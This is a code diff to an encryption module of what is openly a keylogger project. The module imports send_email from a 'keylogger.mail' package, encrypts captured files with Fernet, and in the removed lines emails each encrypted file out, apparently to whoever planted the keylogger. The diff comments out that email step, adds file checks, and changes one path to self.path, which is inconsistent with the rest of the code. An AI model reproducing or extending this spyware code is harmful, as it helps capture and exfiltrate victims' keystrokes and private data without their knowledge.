Changes in Crypto

+++ crypto/Encryption.py
@@ -4,7 +4,7 @@ import os
 
 from keylogger.mail import send_email
 from settings import key_filename, filenames
-from cryptography.KeyGenerator import KeyGenerator
+from crypto.KeyGenerator import KeyGenerator
 
 
 class Encryption:
@@ -19,27 +19,27 @@ class Encryption:
 
         for _, filename in filenames.items():
             self.files_to_encrypt.append(self.file_path + filename)
-            self.encrypted_file_names.append(self.file_path + filename + "_e")
+            pivot = filename.find(".txt")
+            self.encrypted_file_names.append(self.file_path + filename[:pivot] + "_e" + filename[pivot:])
 
         self.encrypt()
 
     def encrypt(self):
         for count, encrypting_file in enumerate(self.files_to_encrypt):
-            with open(self.files_to_encrypt[count], 'rb') as f:
-                data = f.read()
+            if os.path.isfile(self.files_to_encrypt[count]):
+                with open(self.files_to_encrypt[count], 'rb') as f:
+                    data = f.read()
 
-            fernet = Fernet(self.key)
-            encrypted = fernet.encrypt(data)
+                fernet = Fernet(self.key)
+                encrypted = fernet.encrypt(data)
 
-            with open(self.encrypted_file_names[count], 'wb') as f:
-                f.write(encrypted)
+                with open(self.encrypted_file_names[count], 'wb') as f:
+                    f.write(encrypted)
 
-            send_email(self.encrypted_file_names[count], self.encrypted_file_names[count])
-
-        sleep(120)
+                # send_email(self.encrypted_file_names[count], self.encrypted_file_names[count])
 
     def get_key(self):
-        key_path = "\\".join([self.file_path, key_filename])
+        key_path = "\\".join([self.path, key_filename])
         if not os.path.isfile(key_path):
             KeyGenerator(self.file_path)
         with open(key_path, 'rb') as f:
